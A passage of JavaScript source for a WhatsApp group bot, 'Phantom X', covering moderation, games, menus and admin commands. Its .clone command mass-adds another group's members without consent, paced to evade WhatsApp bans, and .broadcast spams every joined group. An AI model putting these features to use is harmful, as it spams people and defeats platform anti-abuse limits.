    if (n === 6)  return buildThemeVoid(ml, time, up, S);
    if (n === 7)  return buildThemeVaporwave(ml, time, up, S);
    if (n === 8)  return buildThemeGothic(ml, time, up, S);
    if (n === 9)  return buildThemeCursive(ml, time, up, S);
    if (n === 10) return buildThemeCosmos(ml, time, up, S);
    if (n === 11) return buildThemeSoft(ml, time, up, S);
    if (n === 12) return buildThemeDiamond(ml, time, up, S);
    if (n === 13) return buildThemeThunder(ml, time, up, S);
    if (n === 14) return buildThemeWarrior(ml, time, up, S);
    if (n === 15) return buildThemeNeon(ml, time, up, S);
    if (n === 16) return buildThemeSpy(ml, time, up, S);
    if (n === 17) return buildThemePirate(ml, time, up, S);
    if (n === 18) return buildThemeShadow(ml, time, up, S);
    if (n === 19) return buildThemeBoldTech(ml, time, up, S);
    if (n === 20) return buildThemeEcho(ml, time, up, S);
    return buildThemeGhost(ml, time, up, S);
}

// --- ANTI-SPAM CHECK ---
function isSpamming(jid) {
    const now = Date.now();
    if (!spamTracker[jid]) spamTracker[jid] = { count: 0, lastTime: now };
    const tracker = spamTracker[jid];
    // Reset count if last message was more than 10 seconds ago
    if (now - tracker.lastTime > 10000) {
        tracker.count = 1;
        tracker.lastTime = now;
    } else {
        tracker.count++;
        tracker.lastTime = now;
    }
    // Flag as spam if more than 5 messages in 10 seconds
    return tracker.count > 5;
}

// --- MESSAGE HANDLER ---
async function handleMessage(sock, msg) {
    try {
        if (!msg.message) return;

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        // Detect self-chat: check if the 'from' JID belongs to the bot's own number
        const ownNumber = (sock.user?.id || "").split(':')[0].split('@')[0];
        const fromNumber = from.split(':')[0].split('@')[0];
        const isSelfChat = !isGroup && (msg.key.fromMe || fromNumber === ownNumber);

        // Skip non-message types cleanly
        if (from === "status@broadcast") return;

        const type = getContentType(msg.message);
        const rawBody =
            (type === "conversation" && msg.message.conversation) ||
            (type === "extendedTextMessage" && msg.message.extendedTextMessage?.text) ||
            (type === "imageMessage" && msg.message.imageMessage?.caption) ||
            "";

        const senderJid = isGroup
            ? msg.key.participant || msg.participant
            : from;

        const reply = (text) => sock.sendMessage(from, { text }, { quoted: msg });
        const replyImg = async (imageUrl, caption) => {
            const buf = await fetchBuffer(imageUrl);
            await sock.sendMessage(from, { image: buf, caption }, { quoted: msg });
        };

        // --- AUTO-REACT (runs on every group message before filtering) ---
        if (isGroup && !msg.key.fromMe) {
            const reactGroups = loadAutoReact();
            if (reactGroups[from]) {
                const emoji = reactGroups[from] === "random"
                    ? AUTO_REACT_EMOJIS[Math.floor(Math.random() * AUTO_REACT_EMOJIS.length)]
                    : reactGroups[from];
                try {
                    await sock.sendMessage(from, { react: { text: emoji, key: msg.key } });
                } catch (_) {}
            }
        }

        // --- ACTIVE GAME MOVE DETECTION (runs before trigger filter) ---
        if (isGroup && rawBody && !msg.key.fromMe) {
            const game = gameState[from];
            if (game?.type === "ttt") {
                const move = parseInt(rawBody.trim());
                if (move >= 1 && move <= 9) {
                    const idx = move - 1;
                    const currentPlayer = game.players[game.turn % 2];
                    if (senderJid !== currentPlayer) {
                        // Not your turn
                    } else if (game.board[idx] !== "") {
                        await reply("❌ That spot is taken. Pick another number 1-9.");
                    } else {
                        const mark = game.turn % 2 === 0 ? "X" : "O";
                        game.board[idx] = mark;
                        game.turn++;
                        if (checkTTTWin(game.board, mark)) {
                            await sock.sendMessage(from, {
                                text: `${renderTTTBoard(game.board)}\n\n🎉 @${senderJid.split("@")[0]} wins! 🏆`,
                                mentions: [senderJid],
                            });
                            delete gameState[from];
                        } else if (game.board.every(c => c !== "")) {
                            await reply(`${renderTTTBoard(game.board)}\n\n🤝 It's a draw!`);
                            delete gameState[from];
                        } else {
                            const next = game.players[game.turn % 2];
                            await sock.sendMessage(from, {
                                text: `${renderTTTBoard(game.board)}\n\n👉 @${next.split("@")[0]}'s turn (${game.turn % 2 === 0 ? "❌" : "⭕"})`,
                                mentions: [next],
                            });
                        }
                    }
                    return;
                }
            }
            if (game?.type === "wordchain") {
                const word = rawBody.trim().toLowerCase().replace(/[^a-z]/g, "");
                if (word.length > 0) {
                    const lastLetter = game.lastWord?.slice(-1);
                    if (lastLetter && word[0] !== lastLetter) {
                        await reply(`❌ Word must start with *${lastLetter.toUpperCase()}*. Try again!`);
                    } else if (game.usedWords?.includes(word)) {
                        await reply(`❌ *${word}* already used! Pick a different word.`);
                    } else {
                        if (!game.usedWords) game.usedWords = [];
                        game.usedWords.push(word);
                        game.lastWord = word;
                        game.lastPlayer = senderJid;
                        const nextLetter = word.slice(-1).toUpperCase();
                        await reply(`✅ *${word.toUpperCase()}* — Next word must start with *${nextLetter}*`);
                    }
                    return;
                }
            }
        }

        // --- TRIGGER FILTER ---
        const triggerChars = ['.', ',', '?'];
        const trimmedBody = rawBody.trimStart();
        const hasTrigger = trimmedBody && triggerChars.some(c => trimmedBody.startsWith(c));
        const hasHidetagAnywhere = rawBody && rawBody.split('\n').some(l => l.trim().toLowerCase().startsWith('.hidetag'));

        // For self-chat or owner group messages: only respond to trigger-prefixed commands
        if ((msg.key.fromMe || isSelfChat) && !hasTrigger && !hasHidetagAnywhere) return;
        // For DMs from other people: skip entirely (no command processing)
        if (!isGroup && !isSelfChat && !msg.key.fromMe) return;

        // --- BOT MODE ENFORCEMENT ---
        const botJid = sock.user?.id || null;
        const currentMode = getBotMode(botJid);
        // In owner mode, only process commands sent by the bot owner themselves (fromMe)
        if (currentMode === "owner" && !msg.key.fromMe && !isSelfChat) return;

        // --- BAN CHECK (bot-level, skip if banned) ---
        if (!msg.key.fromMe && botJid && isBanned(botJid, senderJid)) return;

        // --- GROUP PROTECTION (runs on every group message) ---
        if (isGroup) {
            // Anti-link
            if (getGroupSetting(from, "antilink") && rawBody && containsLink(rawBody)) {
                try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
                const alWarnCount = addWarn(from, senderJid);
                if (alWarnCount >= 3) {
                    resetWarns(from, senderJid);
                    try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                    await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antilink warnings!`, mentions: [senderJid] });
                } else {
                    await sock.sendMessage(from, {
                        text: `⚠️ @${senderJid.split("@")[0]}, links are not allowed here!\n⚠️ Warning *${alWarnCount}/3* — 3 warnings = kick.`,
                        mentions: [senderJid],
                    });
                }
                return;
            }

            // Anti-spam
            if (getGroupSetting(from, "antispam") && rawBody) {
                if (isSpamming(senderJid)) {
                    try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
                    const asWarnCount = addWarn(from, senderJid);
                    if (asWarnCount >= 3) {
                        resetWarns(from, senderJid);
                        try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                        await sock.sendMessage(from, { text: `🚫 @${senderJid.split("@")[0]} has been kicked — 3 antispam warnings!`, mentions: [senderJid] });
                    } else {
                        await sock.sendMessage(from, {
                            text: `🚫 @${senderJid.split("@")[0]}, slow down! Warning *${asWarnCount}/3* — 3 = kick.`,
                            mentions: [senderJid],
                        });
                    }
                    return;
                }
            }

            // Anti-bot (kick any JID that looks like a bot: @lid or contains "bot")
            if (getGroupSetting(from, "antibot") && !msg.key.fromMe) {
                const isLikelyBot = senderJid.endsWith("@lid") || senderJid.toLowerCase().includes("bot");
                if (isLikelyBot) {
                    try { await sock.groupParticipantsUpdate(from, [senderJid], "remove"); } catch (_) {}
                    await sock.sendMessage(from, { text: `🤖 @${senderJid.split("@")[0]} was removed — anti-bot protection active.`, mentions: [senderJid] });
                    return;
                }
            }

            // Auto-reply keywords + "phantom" trigger (for incoming group messages)
            if (!msg.key.fromMe && rawBody) {
                const lowerBody = rawBody.toLowerCase();
                // Phantom → send menu
                if (lowerBody.includes("phantom")) {
                    await sock.sendMessage(from, { text: buildMenuText(currentMode, getMenuTheme(botJid)) }, { quoted: msg });
                    return;
                }
                // Custom keywords
                const keywords = loadAutoReply();
                for (const [kw, rep] of Object.entries(keywords)) {
                    if (lowerBody.includes(kw.toLowerCase())) {
                        await sock.sendMessage(from, { text: rep }, { quoted: msg });
                        return;
                    }
                }
            }
        }

        let body = rawBody;
        if (!body) return;

        // Handle .hidetag appearing on any line (before or after a message)
        const bodyLines = body.trim().split('\n');
        const hidetagLineIdx = bodyLines.findIndex(l => l.trim().toLowerCase().startsWith('.hidetag'));
        if (isGroup && hidetagLineIdx !== -1) {
            try {
                const meta = await sock.groupMetadata(from);
                const members = meta.participants.map(p => p.id);
                const otherText = bodyLines.filter((_, i) => i !== hidetagLineIdx).join('\n').trim();
                // Invisible tag: mentions all members but shows no @numbers in text
                const invisibleText = otherText || '\u200e';
                await sock.sendMessage(from, {
                    text: invisibleText,
                    mentions: members,
                }, { quoted: msg });
            } catch (e) {
                await reply(`❌ Failed to hidetag: ${e?.message || "error"}`);
            }
            return;
        }

        const parts = body.trim().split(" ");
        let cmd = parts[0].toLowerCase();
        // Normalize , and ? prefix → . so users can use any of the three trigger chars
        if (cmd.length > 1 && (cmd.startsWith(',') || cmd.startsWith('?'))) {
            cmd = '.' + cmd.slice(1);
        }
        // --- ALIAS RESOLUTION ---
        const aliases = loadAliases();
        if (aliases[cmd]) {
            const aliasTarget = aliases[cmd];
            body = aliasTarget + (parts.slice(1).length ? " " + parts.slice(1).join(" ") : "");
            const reParts = body.trim().split(" ");
            cmd = reParts[0].toLowerCase();
        }

        switch (cmd) {
            case ".menu":
            case ".phantom": {
                const menuText = buildMenuText(currentMode, getMenuTheme(botJid));
                if (fs.existsSync(MENU_BANNER_FILE)) {
                    try {
                        const bannerBuf = fs.readFileSync(MENU_BANNER_FILE);
                        await sock.sendMessage(from, { image: bannerBuf, caption: menuText }, { quoted: msg });
                    } catch (_) {
                        await sock.sendMessage(from, { text: menuText }, { quoted: msg });
                    }
                } else {
                    await sock.sendMessage(from, { text: menuText }, { quoted: msg });
                }
                break;
            }

            case ".setpp": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const quotedType = quoted ? getContentType(quoted) : null;
                if (!quoted || quotedType !== "imageMessage") {
                    return reply("🖼️ Reply to an image with *.setpp* to set it as the menu banner.\n\nWhenever *.menu* or *.phantom* is used, that image will appear first.");
                }
                await reply("⏳ Saving your menu banner...");
                try {
                    const fakeMsg = { ...msg, message: quoted };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    fs.writeFileSync(MENU_BANNER_FILE, buf);
                    await reply("✅ *Menu banner set!*\n\nNext time you or anyone uses *.menu* or *.phantom*, your image will show first. 🔥");
                } catch (e) {
                    await reply(`❌ Failed to save banner: ${e?.message || "error"}`);
                }
                break;
            }

            case ".mode": {
                const val = parts[1]?.toLowerCase();
                if (!["owner", "public"].includes(val)) {
                    return reply(
                        `⚙️ *Bot Mode Settings*\n\n` +
                        `Current mode: *${currentMode === "owner" ? "👤 Owner Only" : "🌍 Public"}*\n\n` +
                        `• *.mode public* — Anyone in groups can use commands\n` +
                        `• *.mode owner* — Only you (the bot owner) can use commands\n\n` +
                        `_Default is public._`
                    );
                }
                setBotMode(botJid, val);
                const label = val === "owner" ? "👤 Owner Only" : "🌍 Public";
                await reply(`✅ Bot mode set to *${label}*\n\n${val === "owner" ? "Only you can now trigger commands." : "Everyone in groups can now use commands."}`);
                break;
            }

            case ".menudesign": {
                const themeNames = {
                    1:  "👻 Ghost       — Spaced & Stylish",
                    2:  "💻 Matrix      — Hacker Terminal",
                    3:  "👑 Royal       — Elegant Crown",
                    4:  "🔥 Inferno     — Fire & Savage",
                    5:  "✧  Minimal     — Clean & Simple",
                    6:  "🕳️ VOID        — Ultimate Hacker Echo",
                    7:  "🌊 Vaporwave   — Fullwidth Aesthetic",
                    8:  "𝔊  Gothic      — Fraktur Blackletter",
                    9:  "𝒞  Cursive     — Script Handwriting",
                    10: "🌌 Cosmos      — Space & Galaxy",
                    11: "🌸 Soft        — Double-Struck Cute",
                    12: "💎 Diamond     — Bold Luxury Elite",
                    13: "⚡ Thunder     — Bold Sans Electric",
                    14: "⚔️ Warrior     — Small Caps Battle",
                    15: "🌈 Neon        — Circled Colour Pop",
                    16: "🕵️ Spy         — Classified Redacted",
                    17: "🏴‍☠️ Pirate     — Sail the Digital Sea",
                    18: "🌑 Shadow      — Dark & Mysterious",
                    19: "🔲 Bold Tech   — Math Bold Italic",
                    20: "·)) Echo       — Signal Lost Ripple",
                };
                const n = parseInt(parts[1]);
                if (!n || n < 1 || n > 20) {
                    const current = getMenuTheme(botJid);
                    let list = `🎨 *Menu Designs — Choose 1 to 20*\n\nCurrent: *${themeNames[current] || themeNames[1]}*\n\n`;
                    for (const [num, name] of Object.entries(themeNames)) {
                        list += `  *${num}.* ${name}\n`;
                    }
                    list += `\n_Usage: .menudesign 6  (try the VOID!)_`;
                    return reply(list);
                }
                setMenuTheme(botJid, n);
                await reply(`✅ Menu design changed to *${themeNames[n]}*\n\nType *.menu* to see it! 🔥`);
                break;
            }

            case ".broadcast": {
                const intervalMins = parseInt(parts[1]);
                const broadcastMsg = parts.slice(2).join(" ").trim();
                if (!intervalMins || intervalMins < 1 || !broadcastMsg) {
                    return reply(
                        `📡 *Broadcast Usage:*\n\n` +
                        `*.broadcast* ‹interval-mins› ‹your message›\n\n` +
                        `*Example:*\n` +
                        `_.broadcast 10 Hey everyone! Check this out 🔥_\n\n` +
                        `This will send your message to all groups you're in, one group every 10 minutes.\n\n` +
                        `Use *.stopbroadcast* to cancel.`
                    );
                }
                if (broadcastJobs[botJid]) {
                    return reply("⚠️ A broadcast is already running.\n\nUse *.stopbroadcast* to stop it first.");
                }
                await reply("⏳ Fetching your groups...");
                try {
                    const allGroups = await sock.groupFetchAllParticipating();
                    const groupIds = Object.keys(allGroups);
                    if (!groupIds.length) return reply("❌ You're not in any groups.");
                    const intervalMs = intervalMins * 60 * 1000;
                    const totalGroups = groupIds.length;
                    const estMins = totalGroups * intervalMins;
                    await reply(
                        `📡 *Broadcast started!*\n\n` +
                        `📨 Message: _${broadcastMsg}_\n` +
                        `👥 Groups found: *${totalGroups}*\n` +
                        `⏱️ Interval: *every ${intervalMins} min(s)*\n` +
                        `🕐 Est. time: *~${estMins} min(s)*\n\n` +
                        `Use *.stopbroadcast* to cancel anytime.`
                    );
                    let idx = 0;
                    const intervalId = setInterval(async () => {
                        if (idx >= groupIds.length) {
                            clearInterval(intervalId);
                            delete broadcastJobs[botJid];
                            try { await sock.sendMessage(from, { text: `✅ *Broadcast complete!*\n\nMessage sent to all *${totalGroups}* groups successfully.` }); } catch (_) {}
                            return;
                        }
                        const gid = groupIds[idx];
                        idx++;
                        try {
                            await sock.sendMessage(gid, { text: broadcastMsg });
                            await sock.sendMessage(from, { text: `📤 Sent (${idx}/${totalGroups}): ${allGroups[gid]?.subject || gid}` });
                        } catch (e) {
                            await sock.sendMessage(from, { text: `⚠️ Failed (${idx}/${totalGroups}): ${allGroups[gid]?.subject || gid} — ${e?.message || "error"}` });
                        }
                    }, intervalMs);
                    broadcastJobs[botJid] = { intervalId, total: totalGroups };
                } catch (e) {
                    await reply(`❌ Broadcast failed: ${e?.message || "error"}`);
                }
                break;
            }

            case ".stopbroadcast": {
                if (!broadcastJobs[botJid]) return reply("⚠️ No active broadcast to stop.");
                clearInterval(broadcastJobs[botJid].intervalId);
                delete broadcastJobs[botJid];
                await reply("🛑 *Broadcast stopped.* No more messages will be sent.");
                break;
            }

            case ".info": {
                await reply(
                    `🤖 *Phantom X Bot*\n\nVersion: v${BOT_VERSION}\nRuntime: ${formatUptime()}\nBuilt with: Baileys + Node.js\n\n_Built different. Built cold._ 🖤`
                );
                break;
            }

            case ".help": {
                await reply(
`📖 *Phantom X — Full Command Guide*
━━━━━━━━━━━━━━━━━━━━

📋 *GENERAL*
• *.menu / .phantom* — Show menu
• *.info* — Bot version & uptime
• *.ping* — Bot latency
• *.setpp* — Set menu banner (reply to image)
• *.menudesign 1-20* — Switch between 20 menu designs
• *.mode public/owner* — Change who can use the bot
• *.setstatus <text>* — Change WhatsApp About text
• *.setname <name>* — Change WhatsApp display name

━━━━━━━━━━━━━━━━━━━━
⚠️ *MODERATION*
• *.warn @user* — Warn someone (3 warnings = auto-kick)
• *.warnlist* — See all warnings in this group
• *.resetwarn @user* — Clear a member's warnings
• *.ban @user* — Ban from using this bot entirely
• *.unban @user* — Remove ban

━━━━━━━━━━━━━━━━━━━━
👥 *GROUP MANAGEMENT*
• *.add 234xxxxxxxx* — Add member by phone number
• *.kick @user* — Remove a member
• *.promote @user* — Make admin
• *.demote @user* — Remove admin
• *.link* — Get group invite link
• *.revoke* — Reset invite link
• *.mute* — Lock group (admins only)
• *.unmute* — Open group to all
• *.groupinfo* — Full group stats
• *.adminlist* — List all admins
• *.membercount* — How many members
• *.everyone <msg>* — Tag all members with a message

━━━━━━━━━━━━━━━━━━━━
🏷️ *TAG & ANNOUNCE*
• *.hidetag* — Silently tag all members (invisible mentions)
• *.tagall* — Tag all with visible @numbers
• *.readmore* — Hide text behind Read More
• *.broadcast <mins> <msg>* — Send to all groups periodically
• *.stopbroadcast* — Stop broadcast
• *.schedule HH:MM <msg>* — Send a message daily at a specific time
• *.unschedule HH:MM* — Remove a schedule
• *.schedules* — View all active schedules

━━━━━━━━━━━━━━━━━━━━
⚙️ *AUTOMATION*
• *.autoreact on/off/emoji* — Auto-react to every message
• *.autoreply add/remove/list* — Keyword auto-replies
• *.setalias <word> <.cmd>* — Create command shortcut
• *.delalias <word>* — Delete shortcut
• *.aliases* — List all shortcuts
• *.antidelete on/off* — Catch and re-post deleted messages
• *.antibot on/off* — Auto-kick accounts that look like bots

━━━━━━━━━━━━━━━━━━━━
🛡️ *GROUP PROTECTION*
• *.antilink on/off* — Block & warn for links (3 strikes = kick)
• *.antispam on/off* — Block rapid messages (3 strikes = kick)
• *.antidemote on/off* — Instantly punish anyone who demotes an admin

━━━━━━━━━━━━━━━━━━━━
🧠 *AI & MEDIA*
• *.ai / .ask / .gemini <question>* — Ask Gemini AI (need free API key)
• *.imagine <prompt>* — Generate AI image (free)
• *.song <title>* — Search songs via iTunes
• *.lyrics <artist> | <title>* — Get song lyrics
• *.ss / .screenshot <url>* — Screenshot a website
• *.viewonce* — Reveal a view-once image/video (reply to it)
• *.ocr* — Extract text from an image (reply to it)

━━━━━━━━━━━━━━━━━━━━
🔍 *UTILITIES*
• *.translate <lang> <text>* — Translate text (e.g. .translate yo Hello)
  Codes: yo=Yoruba, ig=Igbo, ha=Hausa, fr=French, es=Spanish
• *.weather <city>* — Current weather for any city
• *.calc <expression>* — Calculator (e.g. .calc 5 * 3)
• *.bible <verse>* — Bible verse (e.g. .bible John 3:16)
• *.quran <surah:ayah>* — Quran verse (e.g. .quran 2:255)
• *.groupid* — Get group/community ID

━━━━━━━━━━━━━━━━━━━━
🎮 *GAMES*
• *.flip* — Coin flip (Heads or Tails)
• *.dice [sides]* — Roll a dice (default 6-sided)
• *.8ball <question>* — Magic 8-ball answer
• *.rps rock/paper/scissors* — Play against the bot
• *.slots* — Slot machine (try your luck!)
• *.trivia* — Answer a trivia question (.trivia skip to skip)
• *.hangman <letter>* — Guess the hidden word letter by letter
• *.ttt @p1 @p2* — Start a Tic-Tac-Toe game
• *.truth* — Get a truth question
• *.dare* — Get a dare challenge
• *.wordchain [word]* — Start a word chain game

━━━━━━━━━━━━━━━━━━━━
😂 *FUN*
• *.joke* — Random Nigerian-style joke
• *.fact* — Random interesting fact
• *.quote* — Motivational quote
• *.roast @user* — Roast someone
• *.compliment @user* — Compliment someone

━━━━━━━━━━━━━━━━━━━━
⚽ *FOOTBALL*
• *.pltable* — Premier League standings
• *.live* — Live PL match scores
• *.fixtures <club>* — Club fixtures & results
• *.fnews <club>* — Latest club news
• *.football <club>* — Full club overview

━━━━━━━━━━━━━━━━━━━━
🔄 *GC CLONE*
• *.clone <src> <dst> <batch> <mins>* — Clone members to another group
• *.stopclone* — Stop active clone job

━━━━━━━━━━━━━━━━━━━━
💡 _All group commands require the bot to be admin._
💡 _Keep-alive: Ping your Replit URL every 5 min via UptimeRobot!_`
                );
                break;
            }

            // --- GROUP ADMIN COMMANDS ---
            case ".add": {
                if (!isGroup) return reply("This command only works in groups.");
                const num = parts[1];
                if (!num) return reply("Usage: .add 234xxxxxxxxxx");
                const jid = num.replace(/\D/g, "") + "@s.whatsapp.net";
                await sock.groupParticipantsUpdate(from, [jid], "add");
                await reply(`✅ Added ${num} to the group.`);
                break;
            }

            case ".kick": {
                if (!isGroup) return reply("This command only works in groups.");
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!mentioned.length) return reply("Tag the person to kick. Usage: .kick @user");
                await sock.groupParticipantsUpdate(from, mentioned, "remove");
                await reply("✅ Member removed.");
                break;
            }

            case ".promote": {
                if (!isGroup) return reply("This command only works in groups.");
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!mentioned.length) return reply("Tag the person. Usage: .promote @user");
                await sock.groupParticipantsUpdate(from, mentioned, "promote");
                await reply("✅ Promoted to admin.");
                break;
            }

            case ".demote": {
                if (!isGroup) return reply("This command only works in groups.");
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!mentioned.length) return reply("Tag the person. Usage: .demote @user");
                await sock.groupParticipantsUpdate(from, mentioned, "demote");
                await reply("✅ Admin privileges removed.");
                break;
            }

            case ".link": {
                if (!isGroup) return reply("This command only works in groups.");
                const inv = await sock.groupInviteCode(from);
                // Save invite code for auto-rejoin if bot gets kicked
                savedGroupLinks[from] = inv;
                try {
                    const meta = await sock.groupMetadata(from);
                    groupNames[from] = meta.subject;
                } catch (_) {}
                await reply(`🔗 Group Link:\nhttps://chat.whatsapp.com/${inv}`);
                break;
            }

            case ".revoke": {
                if (!isGroup) return reply("This command only works in groups.");
                await sock.groupRevokeInvite(from);
                await reply("🔄 Group link has been reset.");
                break;
            }

            case ".mute": {
                if (!isGroup) return reply("This command only works in groups.");
                await sock.groupSettingUpdate(from, "announcement");
                await reply("🔇 Group muted. Only admins can send messages now.");
                break;
            }

            case ".unmute": {
                if (!isGroup) return reply("This command only works in groups.");
                await sock.groupSettingUpdate(from, "not_announcement");
                await reply("🔊 Group unmuted. Everyone can send messages.");
                break;
            }

            // --- PROTECTION TOGGLES ---
            case ".antilink": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antilink on/off");
                setGroupSetting(from, "antilink", val === "on");
                await reply(`🔗 Anti-link is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".antispam": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antispam on/off");
                setGroupSetting(from, "antispam", val === "on");
                await reply(`🚫 Anti-spam is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".antidemote": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antidemote on/off");
                setGroupSetting(from, "antidemote", val === "on");
                await reply(`🛡️ Anti-demote is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".welcome": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .welcome on/off");
                setGroupSetting(from, "welcome", val === "on");
                await reply(`📣 Welcome messages are now *${val.toUpperCase()}*.`);
                break;
            }

            case ".goodbye": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .goodbye on/off");
                setGroupSetting(from, "goodbye", val === "on");
                await reply(`👋 Goodbye messages are now *${val.toUpperCase()}*.`);
                break;
            }

            // --- GC CLONE ---
            case ".clone": {
                if (!isGroup) return reply("This command only works in groups.");

                // Usage: .clone <source-link-or-id> <dest-link-or-id> <per-batch> <interval-mins>
                const sourceInput = parts[1];
                const destInput = parts[2];
                const batchSize = parseInt(parts[3]) || 1;
                const intervalMins = parseInt(parts[4]) || 10;

                if (!sourceInput || !destInput) {
                    return reply(
                        `❓ *How to use .clone:*\n\n` +
                        `*.clone* <source> <dest> <per-batch> <every-X-mins>\n\n` +
                        `*Source/Dest can be:*\n` +
                        `• A group invite link (chat.whatsapp.com/...)\n` +
                        `• A group ID (from *.groupid* command)\n\n` +
                        `*Examples:*\n` +
                        `• _.clone link1 link2 1 10_ — 1 person every 10 mins\n` +
                        `• _.clone 123@g.us 456@g.us 2 5_ — 2 people every 5 mins\n\n` +
                        `_Tip: Keep it slow to avoid WhatsApp banning the group._`
                    );
                }

                if (cloneJobs[from]) {
                    return reply("⚠️ A clone job is already running.\n\nUse *.stopclone* to stop it first.");
                }

                if (batchSize < 1 || batchSize > 10) return reply("❌ Batch size must be between 1 and 10.");
                if (intervalMins < 1 || intervalMins > 60) return reply("❌ Interval must be between 1 and 60 minutes.");

                await reply("⏳ Fetching members from source group...");

                try {
                    // Resolve source (link or group ID)
                    let sourceInfo, members;
                    if (sourceInput.endsWith("@g.us")) {
                        sourceInfo = await sock.groupMetadata(sourceInput);
                        members = sourceInfo.participants.map(p => p.id);
                    } else {
                        const sourceCode = sourceInput.split("chat.whatsapp.com/")[1]?.trim();
                        if (!sourceCode) return reply("❌ Invalid source. Use a group link or group ID.");
                        sourceInfo = await sock.groupGetInviteInfo(sourceCode);
                        members = sourceInfo.participants.map(p => p.id);
                    }

                    if (!members.length) return reply("❌ No members found in the source group.");

                    // Resolve destination (link or group ID)
                    let destJid;
                    if (destInput.endsWith("@g.us")) {
                        destJid = destInput;
                    } else {
                        const destCode = destInput.split("chat.whatsapp.com/")[1]?.trim();
                        if (!destCode) return reply("❌ Invalid destination. Use a group link or group ID.");
                        try {
                            const destInfo = await sock.groupGetInviteInfo(destCode);
                            destJid = destInfo.id;
                        } catch {
                            destJid = await sock.groupAcceptInvite(destCode);
                        }
                    }

                    if (!destJid) return reply("❌ Could not access the destination group. Make sure the link is valid.");

                    const totalBatches = Math.ceil(members.length / batchSize);
                    const estTime = totalBatches * intervalMins;

                    await reply(
                        `✅ *Clone job started!*\n\n` +
                        `📤 Source: _${sourceInfo.subject}_\n` +
                        `📥 Destination: group ready\n` +
                        `👥 Members found: *${members.length}*\n\n` +
                        `📋 *Clone Plan:*\n` +
                        `• *${batchSize}* person(s) every *${intervalMins} min(s)*\n` +
                        `• Total batches: *${totalBatches}*\n` +
                        `• Est. time: *~${estTime} minutes*\n\n` +
                        `Use *.stopclone* to stop anytime. Starting now... 🚀`
                    );

                    let index = 0;
                    const intervalMs = intervalMins * 60 * 1000;

                    const intervalId = setInterval(async () => {
                        if (index >= members.length) {
                            clearInterval(intervalId);
                            delete cloneJobs[from];
                            await sock.sendMessage(from, { text: "🎉 *Clone complete!* All members have been added to the destination group." });
                            return;
                        }

                        const batch = members.slice(index, index + batchSize);

                        for (const memberJid of batch) {
                            try {
                                await sock.groupParticipantsUpdate(destJid, [memberJid], "add");
                                await sock.sendMessage(from, {
                                    text: `➕ Added (${index + 1}/${members.length}): @${memberJid.split("@")[0]}`,
                                    mentions: [memberJid],
                                });
                            } catch (e) {
                                await sock.sendMessage(from, {
                                    text: `⚠️ Skipped @${memberJid.split("@")[0]}: ${e?.message || "failed"}`,
                                    mentions: [memberJid],
                                });
                            }
                            index++;
                        }
                    }, intervalMs);

                    cloneJobs[from] = { intervalId, members, total: members.length, index: 0 };
                } catch (err) {
                    console.error("Clone error:", err?.message || err);
                    await reply("❌ Failed to start clone. Check that both links are valid.");
                }
                break;
            }

            case ".stopclone": {
                if (!isGroup) return reply("This command only works in groups.");
                if (!cloneJobs[from]) return reply("⚠️ No active clone job in this group.");
                clearInterval(cloneJobs[from].intervalId);
                const done = cloneJobs[from].members.filter((_, i) => i < cloneJobs[from].total).length;
                delete cloneJobs[from];
                await reply(`🛑 *Clone stopped.*\n\nJob cancelled successfully.`);
                break;
            }

            // --- HIDETAG (standalone, no text after command) ---
            case ".hidetag": {
                if (!isGroup) return reply("This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const members = meta.participants.map(p => p.id);
                    // Text after .hidetag on the same line
                    const inlineText = parts.slice(1).join(" ").trim();
                    const invisibleText = inlineText || '\u200e';
                    await sock.sendMessage(from, {
                        text: invisibleText,
                        mentions: members,
                    }, { quoted: msg });
                } catch (e) {
                    await reply(`❌ Failed to hidetag: ${e?.message || "error"}`);
                }
                break;
            }

            // --- TAGALL ---
            case ".tagall": {
                if (!isGroup) return reply("This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const members = meta.participants.map(p => p.id);
                    const customText = parts.slice(1).join(" ").trim();
                    const tagText = members.map(j => `@${j.split("@")[0]}`).join(" ");
                    const fullText = customText ? `${customText}\n\n${tagText}` : tagText;
                    await sock.sendMessage(from, {
                        text: fullText,
                        mentions: members,
                    }, { quoted: msg });
                } catch (e) {
                    await reply(`❌ Failed to tagall: ${e?.message || "error"}`);
                }
                break;
            }

            // --- READMORE ---
            case ".readmore": {
                // Usage: <visible text> .readmore <hidden text>
                // OR: .readmore <hidden text> (visible text taken as nothing)
                const fullText = body.trim();
                const readmoreIdx = fullText.toLowerCase().indexOf('.readmore');
                const beforeText = fullText.slice(0, readmoreIdx).trim();
                const afterText = fullText.slice(readmoreIdx + '.readmore'.length).trim();

                if (!afterText && !beforeText) {
                    return reply(
                        `❓ *How to use .readmore:*\n\n` +
                        `Type the visible part, then *.readmore*, then the hidden part.\n\n` +
                        `*Example:*\n` +
